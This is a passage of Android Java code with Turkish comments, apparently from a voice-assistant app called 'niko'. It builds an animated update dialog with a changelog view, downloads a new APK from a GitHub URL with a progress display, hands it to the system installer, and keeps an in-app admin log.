        android.graphics.drawable.GradientDrawable versionChipBg = new android.graphics.drawable.GradientDrawable();
        versionChipBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
        versionChipBg.setCornerRadius(16);
        versionChipBg.setColor(Color.parseColor("#15FFFFFF"));
        versionCompare.setBackground(versionChipBg);

        // Mevcut sürüm
        TextView txtCurrentVer = new TextView(this);
        txtCurrentVer.setText(getCurrentVersion());
        txtCurrentVer.setTextColor(Color.parseColor("#FF6B6B"));
        txtCurrentVer.setTextSize(14);
        txtCurrentVer.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
        versionCompare.addView(txtCurrentVer);

        // Ok işareti
        TextView txtArrow = new TextView(this);
        txtArrow.setText("  →  ");
        txtArrow.setTextColor(Color.parseColor("#66FFFFFF"));
        txtArrow.setTextSize(16);
        versionCompare.addView(txtArrow);

        // Yeni sürüm
        TextView txtNewVer = new TextView(this);
        txtNewVer.setText(latestVersion);
        txtNewVer.setTextColor(Color.parseColor("#4CAF50"));
        txtNewVer.setTextSize(14);
        txtNewVer.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
        versionCompare.addView(txtNewVer);

        mainLayout.addView(versionCompare);

        // ===== AYIRICI ÇİZGİ (gradient) =====
        View divider1 = new View(this);
        LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 2);
        dividerParams.setMargins(0, 0, 0, 24);
        divider1.setLayoutParams(dividerParams);
        android.graphics.drawable.GradientDrawable dividerGradient = new android.graphics.drawable.GradientDrawable();
        dividerGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
        dividerGradient.setColors(new int[]{Color.TRANSPARENT, Color.parseColor("#3300E5FF"), Color.TRANSPARENT});
        dividerGradient.setOrientation(android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT);
        divider1.setBackground(dividerGradient);
        mainLayout.addView(divider1);

        // ===== AÇIKLAMA BÖLÜMÜ =====
        TextView txtDesc = new TextView(this);
        txtDesc.setText(updateDescription);
        txtDesc.setTextColor(Color.parseColor("#E0E0E0"));
        txtDesc.setTextSize(15);
        txtDesc.setLineSpacing(10, 1.3f);
        txtDesc.setPadding(0, 0, 0, 20);
        txtDesc.setTypeface(android.graphics.Typeface.create("sans-serif", android.graphics.Typeface.NORMAL));
        mainLayout.addView(txtDesc);

        // ===== CHANGELOG BÖLÜMÜ (varsa) =====
        if (updateChangelog != null && !updateChangelog.isEmpty()) {
            // Ana Changelog container
            LinearLayout changelogContainer = new LinearLayout(this);
            changelogContainer.setOrientation(LinearLayout.VERTICAL);
            LinearLayout.LayoutParams changelogParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            changelogParams.setMargins(0, 8, 0, 20);
            changelogContainer.setLayoutParams(changelogParams);

            // Premium başlık bölümü
            LinearLayout changelogHeader = new LinearLayout(this);
            changelogHeader.setOrientation(LinearLayout.HORIZONTAL);
            changelogHeader.setGravity(android.view.Gravity.CENTER_VERTICAL);
            changelogHeader.setPadding(0, 0, 0, 16);

            // Başlık ikonu için container (gradient arka plan)
            android.widget.FrameLayout iconFrame = new android.widget.FrameLayout(this);
            LinearLayout.LayoutParams iconFrameParams = new LinearLayout.LayoutParams(36, 36);
            iconFrameParams.setMargins(0, 0, 14, 0);
            iconFrame.setLayoutParams(iconFrameParams);
            
            android.graphics.drawable.GradientDrawable iconBgDrawable = new android.graphics.drawable.GradientDrawable();
            iconBgDrawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
            iconBgDrawable.setCornerRadius(10);
            iconBgDrawable.setColors(new int[]{Color.parseColor("#FFD700"), Color.parseColor("#FFA500")});
            iconBgDrawable.setOrientation(android.graphics.drawable.GradientDrawable.Orientation.TL_BR);
            iconFrame.setBackground(iconBgDrawable);
            
            TextView changelogIconText = new TextView(this);
            changelogIconText.setText("📝");
            changelogIconText.setTextSize(16);
            changelogIconText.setGravity(android.view.Gravity.CENTER);
            android.widget.FrameLayout.LayoutParams iconTextParams = new android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT, 
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT);
            changelogIconText.setLayoutParams(iconTextParams);
            iconFrame.addView(changelogIconText);
            changelogHeader.addView(iconFrame);

            // Başlık ve alt başlık
            LinearLayout titleBlock = new LinearLayout(this);
            titleBlock.setOrientation(LinearLayout.VERTICAL);

            TextView txtChangelogLabel = new TextView(this);
            txtChangelogLabel.setText("DEĞİŞİKLİKLER");
            txtChangelogLabel.setTextColor(Color.parseColor("#FFD700"));
            txtChangelogLabel.setTextSize(13);
            txtChangelogLabel.setLetterSpacing(0.1f);
            txtChangelogLabel.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.BOLD));
            titleBlock.addView(txtChangelogLabel);

            TextView txtChangelogSub = new TextView(this);
            txtChangelogSub.setText("Bu sürümdeki yenilikler");
            txtChangelogSub.setTextColor(Color.parseColor("#66FFFFFF"));
            txtChangelogSub.setTextSize(11);
            titleBlock.addView(txtChangelogSub);

            changelogHeader.addView(titleBlock);
            changelogContainer.addView(changelogHeader);

            // Değişiklik öğelerini parse et ve her biri için premium kart oluştur
            String[] changelogLines = updateChangelog.split("\n");
            int itemIndex = 0;
            
            for (String line : changelogLines) {
                String trimmedLine = line.trim();
                if (trimmedLine.isEmpty()) continue;
                
                // Öğe kartı
                LinearLayout itemCard = new LinearLayout(this);
                itemCard.setOrientation(LinearLayout.HORIZONTAL);
                itemCard.setGravity(android.view.Gravity.CENTER_VERTICAL);
                LinearLayout.LayoutParams itemParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                itemParams.setMargins(0, 0, 0, 10);
                itemCard.setLayoutParams(itemParams);
                itemCard.setPadding(16, 14, 16, 14);
                
                // Kart arka planı (glassmorphism)
                android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
                cardBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
                cardBg.setCornerRadius(14);
                cardBg.setColor(Color.parseColor("#12FFFFFF"));
                itemCard.setBackground(cardBg);
                itemCard.setElevation(2);

                // Sol renk çubuğu
                View colorBar = new View(this);
                LinearLayout.LayoutParams barParams = new LinearLayout.LayoutParams(4, LinearLayout.LayoutParams.MATCH_PARENT);
                barParams.setMargins(0, 0, 14, 0);
                colorBar.setLayoutParams(barParams);
                
                // Her öğe için farklı renk
                String[] barColors = {"#00E5FF", "#4CAF50", "#FF9800", "#E91E63", "#9C27B0", "#3F51B5"};
                android.graphics.drawable.GradientDrawable barBg = new android.graphics.drawable.GradientDrawable();
                barBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
                barBg.setCornerRadius(2);
                barBg.setColor(Color.parseColor(barColors[itemIndex % barColors.length]));
                colorBar.setBackground(barBg);
                itemCard.addView(colorBar);

                // İçerik alanı
                LinearLayout contentArea = new LinearLayout(this);
                contentArea.setOrientation(LinearLayout.VERTICAL);
                LinearLayout.LayoutParams contentParams = new LinearLayout.LayoutParams(
                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
                contentArea.setLayoutParams(contentParams);

                // Emoji ve metin ayırma
                String displayText = trimmedLine;
                String emoji = "";
                
                // Başındaki bullet point veya tire kaldır
                if (displayText.startsWith("•") || displayText.startsWith("-") || displayText.startsWith("*")) {
                    displayText = displayText.substring(1).trim();
                }
                
                // Emoji varsa ayır
                if (displayText.length() > 2) {
                    String firstChars = displayText.substring(0, 2);
                    if (Character.isHighSurrogate(firstChars.charAt(0)) || 
                        firstChars.codePointAt(0) > 127) {
                        // İlk karakterler emoji olabilir
                        int emojiEnd = 0;
                        for (int i = 0; i < Math.min(4, displayText.length()); i++) {
                            if (Character.isWhitespace(displayText.charAt(i))) {
                                emojiEnd = i;
                                break;
                            }
                            emojiEnd = i + 1;
                        }
                        emoji = displayText.substring(0, emojiEnd).trim();
                        displayText = displayText.substring(emojiEnd).trim();
                    }
                }

                // Başlık ve açıklama ayır (: ile)
                String itemTitle = displayText;
                String itemDesc = "";
                int colonIndex = displayText.indexOf(":");
                if (colonIndex > 0 && colonIndex < displayText.length() - 1) {
                    itemTitle = displayText.substring(0, colonIndex).trim();
                    itemDesc = displayText.substring(colonIndex + 1).trim();
                }

                // Emoji gösterimi (varsa)
                if (!emoji.isEmpty()) {
                    TextView emojiView = new TextView(this);
                    emojiView.setText(emoji);
                    emojiView.setTextSize(16);
                    emojiView.setPadding(0, 0, 0, 4);
                    contentArea.addView(emojiView);
                }

                // Başlık metni
                TextView titleText = new TextView(this);
                titleText.setText(itemTitle);
                titleText.setTextColor(Color.WHITE);
                titleText.setTextSize(13);
                titleText.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.BOLD));
                contentArea.addView(titleText);

                // Açıklama (varsa)
                if (!itemDesc.isEmpty()) {
                    TextView descText = new TextView(this);
                    descText.setText(itemDesc);
                    descText.setTextColor(Color.parseColor("#99FFFFFF"));
                    descText.setTextSize(12);
                    descText.setPadding(0, 4, 0, 0);
                    descText.setLineSpacing(4, 1.1f);
                    contentArea.addView(descText);
                }

                itemCard.addView(contentArea);
                changelogContainer.addView(itemCard);

                // Stagger animasyonu
                final int delay = itemIndex * 80;
                itemCard.setAlpha(0f);
                itemCard.setTranslationX(30);
                itemCard.animate()
                    .alpha(1f)
                    .translationX(0)
                    .setStartDelay(delay + 200)
                    .setDuration(300)
                    .setInterpolator(new android.view.animation.DecelerateInterpolator())
                    .start();

                itemIndex++;
            }

            mainLayout.addView(changelogContainer);
        }

        // ===== DOSYA BOYUTU (varsa) =====
        if (updateFileSize > 0) {
            LinearLayout sizeContainer = new LinearLayout(this);
            sizeContainer.setOrientation(LinearLayout.HORIZONTAL);
            sizeContainer.setGravity(android.view.Gravity.CENTER_VERTICAL);
            sizeContainer.setPadding(16, 12, 16, 12);
            LinearLayout.LayoutParams sizeParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            sizeParams.setMargins(0, 0, 0, 24);
            sizeContainer.setLayoutParams(sizeParams);
            
            android.graphics.drawable.GradientDrawable sizeBg = new android.graphics.drawable.GradientDrawable();
            sizeBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
            sizeBg.setCornerRadius(12);
            sizeBg.setColor(Color.parseColor("#10FFFFFF"));
            sizeContainer.setBackground(sizeBg);

            TextView sizeIcon = new TextView(this);
            sizeIcon.setText("📦");
            sizeIcon.setTextSize(14);
            sizeIcon.setPadding(0, 0, 10, 0);
            sizeContainer.addView(sizeIcon);

            TextView txtSize = new TextView(this);
            String sizeText = String.format(Locale.getDefault(), "%.1f MB", updateFileSize / (1024.0 * 1024.0));
            txtSize.setText(sizeText);
            txtSize.setTextColor(Color.parseColor("#80FFFFFF"));
            txtSize.setTextSize(13);
            txtSize.setTypeface(android.graphics.Typeface.MONOSPACE);
            sizeContainer.addView(txtSize);

            mainLayout.addView(sizeContainer);
        }

        // ===== PROGRESS BAR ALANI (başlangıçta gizli) =====
        LinearLayout progressLayout = new LinearLayout(this);
        progressLayout.setOrientation(LinearLayout.VERTICAL);
        progressLayout.setVisibility(View.GONE);
        progressLayout.setPadding(8, 24, 8, 24);

        // Premium progress bar container
        android.widget.FrameLayout progressContainer = new android.widget.FrameLayout(this);
        LinearLayout.LayoutParams progressContainerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 16);
        progressContainer.setLayoutParams(progressContainerParams);

        // Progress arka planı
        View progressBg = new View(this);
        android.widget.FrameLayout.LayoutParams progressBgParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT, 16);
        progressBg.setLayoutParams(progressBgParams);
        android.graphics.drawable.GradientDrawable progressBgDrawable = new android.graphics.drawable.GradientDrawable();
        progressBgDrawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
        progressBgDrawable.setCornerRadius(8);
        progressBgDrawable.setColor(Color.parseColor("#1A1A2E"));
        progressBg.setBackground(progressBgDrawable);
        progressContainer.addView(progressBg);

        // Progress bar
        updateProgressBar = new android.widget.ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        updateProgressBar.setMax(100);
        updateProgressBar.setProgress(0);
        android.widget.FrameLayout.LayoutParams progressBarParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT, 16);
        updateProgressBar.setLayoutParams(progressBarParams);
        
        // Gradient progress drawable
        android.graphics.drawable.LayerDrawable progressDrawable = (android.graphics.drawable.LayerDrawable) updateProgressBar.getProgressDrawable();
        progressDrawable.getDrawable(1).setColorFilter(Color.parseColor("#00E5FF"), android.graphics.PorterDuff.Mode.SRC_IN);
        
        updateProgressBar.setClipToOutline(true);
        progressContainer.addView(updateProgressBar);
        progressLayout.addView(progressContainer);

        // Progress metin
        updateProgressText = new TextView(this);
        updateProgressText.setText("İndirme başlatılıyor...");
        updateProgressText.setTextColor(Color.parseColor("#00E5FF"));
        updateProgressText.setTextSize(13);
        updateProgressText.setGravity(android.view.Gravity.CENTER);
        updateProgressText.setPadding(0, 16, 0, 0);
        updateProgressText.setTypeface(android.graphics.Typeface.MONOSPACE);
        progressLayout.addView(updateProgressText);

        mainLayout.addView(progressLayout);

        // ===== İKİNCİL BUTONLAR (önce tanımla, listener'da kullanılacak) =====
        LinearLayout buttonLayout = new LinearLayout(this);
        buttonLayout.setOrientation(LinearLayout.HORIZONTAL);
        buttonLayout.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams buttonLayoutParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        buttonLayoutParams.setMargins(0, 20, 0, 0);
        buttonLayout.setLayoutParams(buttonLayoutParams);

        // ===== ANA GÜNCELLEME BUTONU =====
        TextView btnUpdate = new TextView(this);
        btnUpdate.setText("⬇️  ŞİMDİ GÜNCELLE");
        btnUpdate.setTextColor(Color.parseColor("#0A0A14"));
        btnUpdate.setTextSize(16);
        btnUpdate.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.BOLD));
        btnUpdate.setGravity(android.view.Gravity.CENTER);
        btnUpdate.setLetterSpacing(0.05f);
        LinearLayout.LayoutParams updateBtnParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        updateBtnParams.setMargins(0, 16, 0, 0);
        btnUpdate.setLayoutParams(updateBtnParams);
        btnUpdate.setPadding(0, 40, 0, 40);
        btnUpdate.setElevation(12);
        
        // Premium gradient buton
        android.graphics.drawable.GradientDrawable btnBg = new android.graphics.drawable.GradientDrawable();
        btnBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
        btnBg.setCornerRadius(24);
        btnBg.setColors(new int[]{Color.parseColor("#00E5FF"), Color.parseColor("#00D4AA")});
        btnBg.setOrientation(android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT);
        btnUpdate.setBackground(btnBg);
        
        // Touch feedback
        btnUpdate.setOnTouchListener((v, event) -> {
            switch (event.getAction()) {
                case android.view.MotionEvent.ACTION_DOWN:
                    v.animate().scaleX(0.96f).scaleY(0.96f).setDuration(100).start();
                    break;
                case android.view.MotionEvent.ACTION_UP:
                case android.view.MotionEvent.ACTION_CANCEL:
                    v.animate().scaleX(1f).scaleY(1f).setDuration(100).start();
                    break;
            }
            return false;
        });
        
        btnUpdate.setOnClickListener(v -> {
            vibrateFeedback();
            // Animasyonlu geçiş
            buttonLayout.animate().alpha(0f).setDuration(200).withEndAction(() -> {
                buttonLayout.setVisibility(View.GONE);
            }).start();
            btnUpdate.animate().alpha(0f).setDuration(200).withEndAction(() -> {
                btnUpdate.setVisibility(View.GONE);
                progressLayout.setVisibility(View.VISIBLE);
                progressLayout.setAlpha(0f);
                progressLayout.animate().alpha(1f).setDuration(300).start();
                downloadAndInstallUpdateWithProgress(progressLayout);
            }).start();
        });

        mainLayout.addView(btnUpdate);

        // ===== İKİNCİL BUTONLARI DOLDUR =====


        // "Sonra" butonu
        TextView btnLater = new TextView(this);
        btnLater.setText("Daha Sonra");
        btnLater.setTextColor(Color.parseColor("#80FFFFFF"));
        btnLater.setTextSize(14);
        btnLater.setPadding(40, 20, 40, 20);
        btnLater.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.NORMAL));
        
        // Touch feedback
        btnLater.setOnTouchListener((v, event) -> {
            switch (event.getAction()) {
                case android.view.MotionEvent.ACTION_DOWN:
                    ((TextView) v).setTextColor(Color.parseColor("#FFFFFF"));
                    break;
                case android.view.MotionEvent.ACTION_UP:
                case android.view.MotionEvent.ACTION_CANCEL:
                    ((TextView) v).setTextColor(Color.parseColor("#80FFFFFF"));
                    break;
            }
            return false;
        });
        
        btnLater.setOnClickListener(v -> {
            vibrateFeedback();
            updateDialog.dismiss();
        });
        buttonLayout.addView(btnLater);

        // Separator
        TextView separator = new TextView(this);
        separator.setText("│");
        separator.setTextColor(Color.parseColor("#33FFFFFF"));
        separator.setTextSize(14);
        separator.setPadding(8, 0, 8, 0);
        buttonLayout.addView(separator);

        // "Bu Sürümü Atla" butonu
        TextView btnSkip = new TextView(this);
        btnSkip.setText("Bu Sürümü Atla");
        btnSkip.setTextColor(Color.parseColor("#FF6B6B"));
        btnSkip.setTextSize(14);
        btnSkip.setPadding(40, 20, 40, 20);
        btnSkip.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.NORMAL));
        
        // Touch feedback
        btnSkip.setOnTouchListener((v, event) -> {
            switch (event.getAction()) {
                case android.view.MotionEvent.ACTION_DOWN:
                    ((TextView) v).setTextColor(Color.parseColor("#FF9999"));
                    break;
                case android.view.MotionEvent.ACTION_UP:
                case android.view.MotionEvent.ACTION_CANCEL:
                    ((TextView) v).setTextColor(Color.parseColor("#FF6B6B"));
                    break;
            }
            return false;
        });
        
        btnSkip.setOnClickListener(v -> {
            vibrateFeedback();
            updatePrefs.edit().putString("skipped_version", latestVersion).apply();
            addLog("[UPDATE] Sürüm " + latestVersion + " atlandı.");
            Toast.makeText(this, "Bu sürüm atlandı", Toast.LENGTH_SHORT).show();
            updateDialog.dismiss();
        });
        buttonLayout.addView(btnSkip);

        mainLayout.addView(buttonLayout);

        // ScrollView'e ekle
        scrollView.addView(mainLayout);

        // Dialog'u ayarla
        updateDialog.setContentView(scrollView);
        
        // Dialog penceresi ayarları
        if (updateDialog.getWindow() != null) {
            updateDialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
            updateDialog.getWindow().setLayout(
                (int)(getResources().getDisplayMetrics().widthPixels * 0.92),
                android.view.WindowManager.LayoutParams.WRAP_CONTENT
            );
            // Giriş animasyonu
            updateDialog.getWindow().getAttributes().windowAnimations = android.R.style.Animation_Dialog;
        }

        updateDialog.show();
        
        // Dialog açılış animasyonu
        mainLayout.setScaleX(0.9f);
        mainLayout.setScaleY(0.9f);
        mainLayout.setAlpha(0f);
        mainLayout.animate()
            .scaleX(1f)
            .scaleY(1f)
            .alpha(1f)
            .setDuration(300)
            .setInterpolator(new android.view.animation.OvershootInterpolator(1.1f))
            .start();

        addLog("[UPDATE] Premium güncelleme dialogu gösterildi: v" + latestVersion);
    }

    /**
     * İlerleme çubuğu ile güncelleme indir ve kur.
     */
    private void downloadAndInstallUpdateWithProgress(LinearLayout progressLayout) {
        addLog("[UPDATE] İndirme başlatılıyor...");

        new Thread(() -> {
            try {
                URL url = new URL(GITHUB_APK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                conn.connect();

                int fileLength = conn.getContentLength();
                addLog("[UPDATE] Dosya boyutu: " + (fileLength / 1024) + " KB");

                File apkFile = new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_DOWNLOADS), "niko_update.apk");
                if (apkFile.exists()) apkFile.delete();

                InputStream input = conn.getInputStream();
                FileOutputStream output = new FileOutputStream(apkFile);
                byte[] buffer = new byte[8192];
                int bytesRead;
                long totalBytesRead = 0;
                long lastUpdateTime = 0;

                while ((bytesRead = input.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;

                    // Her 100ms'de bir progress güncelle (performans için)
                    long currentTime = System.currentTimeMillis();
                    if (currentTime - lastUpdateTime > 100 || totalBytesRead == fileLength) {
                        lastUpdateTime = currentTime;
                        final int progress = fileLength > 0 ? (int)((totalBytesRead * 100) / fileLength) : 0;
                        final long finalTotal = totalBytesRead;
                        
                        runOnUiThread(() -> {
                            if (updateProgressBar != null) {
                                updateProgressBar.setProgress(progress);
                            }
                            if (updateProgressText != null) {
                                String progressStr = String.format(Locale.getDefault(),
                                    "İndiriliyor... %%%d (%.1f MB / %.1f MB)",
                                    progress,
                                    finalTotal / (1024.0 * 1024.0),
                                    fileLength / (1024.0 * 1024.0));
                                updateProgressText.setText(progressStr);
                            }
                        });
                    }
                }

                output.close();
                input.close();

                addLog("[UPDATE] İndirme tamamlandı, kurulum başlatılıyor...");

                runOnUiThread(() -> {
                    if (updateProgressText != null) {
                        updateProgressText.setText("✅ Kurulum başlatılıyor...");
                        updateProgressText.setTextColor(Color.parseColor("#4CAF50"));
                    }
                    // Kısa bir gecikme sonra kur
                    new android.os.Handler().postDelayed(() -> {
                        if (updateDialog != null && updateDialog.isShowing()) {
                            updateDialog.dismiss();
                        }
                        installApk(apkFile);
                    }, 1000);
                });

            } catch (Exception e) {
                addLog("[UPDATE] İndirme hatası: " + e.getMessage());
                runOnUiThread(() -> {
                    if (updateProgressText != null) {
                        updateProgressText.setText("❌ İndirme hatası");
                        updateProgressText.setTextColor(Color.parseColor("#FF6B6B"));
                    }
                    Toast.makeText(this, "İndirme başarısız oldu", Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }

    /**
     * Eski basit dialog (geriye dönük uyumluluk için korunuyor).
     */
    private void showUpdateDialog() {
        showPremiumUpdateDialog();
    }

    /**
     * Eski indirme metodu (geriye dönük uyumluluk için korunuyor).
     */
    private void downloadAndInstallUpdate() {
        Toast.makeText(this, "İndiriliyor...", Toast.LENGTH_SHORT).show();
        downloadAndInstallUpdateWithProgress(null);
    }

    private void installApk(File apkFile) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri apkUri = Build.VERSION.SDK_INT >= Build.VERSION_CODES.N 
                ? FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", apkFile)
                : Uri.fromFile(apkFile);
            
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivity(intent);
            addLog("[UPDATE] APK kurulum ekranı açıldı.");
        } catch (Exception e) {
            addLog("[UPDATE] Kurulum hatası: " + e.getMessage());
            Toast.makeText(this, "Kurulum hatası: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    /**
     * Manuel güncelleme kontrolü (Sesli komutlar veya ayarlardan tetiklenir).
     */
    private void manualUpdateCheck() {
        // Atlanan sürümü sıfırla ki manuel kontrollerde gösterilsin
        updatePrefs.edit().remove("skipped_version").apply();
        Toast.makeText(this, "Güncelleme kontrol ediliyor...", Toast.LENGTH_SHORT).show();
        checkForUpdates();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (speechRecognizer != null)
            speechRecognizer.destroy();
        if (tts != null)
            tts.shutdown();

    }

    // ================= ADMIN LOG YÖNETİMİ =================

    /**
     * Uygulama içine bir log kaydı ekler.
     */
    private void addLog(String message) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = "[" + time + "] " + message + "\n";
        
        synchronized (appLogsBuffer) {
            appLogsBuffer.append(logEntry);
            // Sınırı aşarsa baştan sil
            if (appLogsBuffer.length() > MAX_LOG_SIZE) {
                appLogsBuffer.delete(0, 1000);
            }
        }
        
        if (layoutAdminLogs != null && layoutAdminLogs.getVisibility() == View.VISIBLE) {
            runOnUiThread(this::updateLogDisplay);
        }
        // android.util.Log.d("NIKO_LOG", message);
    }

    private void updateLogDisplay() {
        if (txtAdminLogs != null) {
            txtAdminLogs.setText(appLogsBuffer.toString());
        }
    }

    private void showLogs() {
        runOnUiThread(() -> {
            updateLogDisplay();
            layoutAdminLogs.setVisibility(View.VISIBLE);
            layoutAdminLogs.setAlpha(0f);
            layoutAdminLogs.animate().alpha(1f).setDuration(300).start();
        });
    }

    private void hideLogs() {
        runOnUiThread(() -> {
            layoutAdminLogs.animate().alpha(0f).setDuration(300).withEndAction(() -> {
                layoutAdminLogs.setVisibility(View.GONE);
            }).start();
        });
    }
}